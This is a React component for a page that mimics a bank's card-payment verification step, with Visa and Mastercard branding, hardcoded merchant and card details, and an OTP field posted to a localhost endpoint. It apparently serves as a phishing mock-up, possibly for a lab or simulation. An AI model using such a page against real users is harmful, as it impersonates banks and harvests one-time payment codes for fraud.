// src/pages/PaymentVerificationPage.js
import React, { useState } from 'react'; // Import React and useState hook for state management
import '../global.css'; // Import global CSS for styling
import MASIB from '../images/MASIB.png'; // Import bank logo image
import VISA from '../images/verified_by_visa.png'; // Import Verified by Visa logo
import MASTC from '../images/mastercardsecurecode_logo.png'; // Import Mastercard SecureCode logo

const PaymentVerificationPage = () => {
    // State to store the payment token (OTP code) entered by the user
    const [paymentToken, setPaymentToken] = useState('');

    // State to control the visibility of an error message
    const [showError, setShowError] = useState(false);

    // State to store and display a success message with the verified token
    const [successMessage, setSuccessMessage] = useState(null);

    // Handle form submission for payment verification
    const handleSubmit = async (e) => {
        e.preventDefault(); // Prevent default form submission behavior

        // Check if the payment token is empty or just whitespace
        if (paymentToken.trim() === "") {
            alert("Veuillez entrer le code reçu."); // Alert user to enter the code
            return;
        }

        try {
            // Send POST request to verify the payment token
            const response = await fetch('https://127.0.0.1:8043/payment', {
                method: 'POST', // HTTP method
                headers: {'Content-Type': 'application/json'}, // Specify JSON content type
                body: JSON.stringify({ paymentToken }) // Send payment token in request body
            });

            if (response.ok) { // Check if response status is 200-299
                setShowError(false); // Hide any previous error message
                setSuccessMessage(paymentToken); // Set success message with the token
                // Redirect to homepage after 3 seconds
                setTimeout(() => {
                    window.location.href = '/';
                }, 3000);
            } else {
                setShowError(true); // Show error message if verification fails
            }
        } catch (error) {
            console.error('Error submitting payment:', error); // Log error to console
            setShowError(true); // Show error message on network/server failure
        }
    };

    // JSX to render the payment verification UI
    return (
        <div className="verification-container"> {/* Main container for styling */}
            <div className="verification-box"> {/* Inner box for content */}
                <div className="logo-container"> {/* Container for logos */}
                    <div className="left-logo"> {/* Left-aligned bank logo */}
                        <img src={MASIB} alt="Logo Banque" /> {/* Display bank logo */}
                    </div>
                    <div className="right-logos"> {/* Right-aligned card brand logos */}
                        <img src={VISA} alt="Verified by Visa" /> {/* Verified by Visa logo */}
                        <img src={MASTC} alt="MasterCard" /> {/* Mastercard SecureCode logo */}
                    </div>
                </div>

                {/* Inform user about the verification code */}
                <p>A verification code has been sent to your registered number.</p>

                <form onSubmit={handleSubmit}> {/* Form with submit handler */}
                    <div className="form-group"> {/* Merchant name field */}
                        <label>Marchant name :</label>
                        <input type="text" value="Grapes" disabled /> {/* Hardcoded, non-editable */}
                    </div>

                    <div className="form-group"> {/* Transaction amount field */}
                        <label>Amount of the transaction :</label>
                        <input type="text" value="EURO 45.99 €" disabled /> {/* Hardcoded, non-editable */}
                    </div>

                    <div className="form-group"> {/* Card number field */}
                        <label>Card number :</label>
                        <input type="text" value="XXXX XXXX XXXX 0237" disabled /> {/* Hardcoded, masked card number */}
                    </div>

                    <div className="form-group"> {/* OTP input field */}
                        <label>Entrez le code reçu :</label>
                        <input
                            type="text" // Text input for OTP
                            placeholder="Entrer the OTP code here" // Placeholder text
                            value={paymentToken} // Controlled input value
                            onChange={(e) => setPaymentToken(e.target.value)} // Update state on change
                        />
                    </div>

                    <button type="submit">Confirm</button> {/* Submit button */}
                </form>

                {/* Display error message if verification fails */}
                {showError && (
                    <p className="error-message">
                        Paiement échoué, le code n'a pas pu être vérifié.
                    </p>
                )}

                {/* Display success message if verification succeeds */}
                {successMessage && (
                    <div className="success-message">
                        <p>
                            Paiement réussi avec le code : <strong>{successMessage}</strong>.<br />
                            Redirection vers la page d'accueil dans 3 secondes...
                        </p>
                    </div>
                )}
            </div>
        </div>
    );
};

export default PaymentVerificationPage; // Export the component for use in the app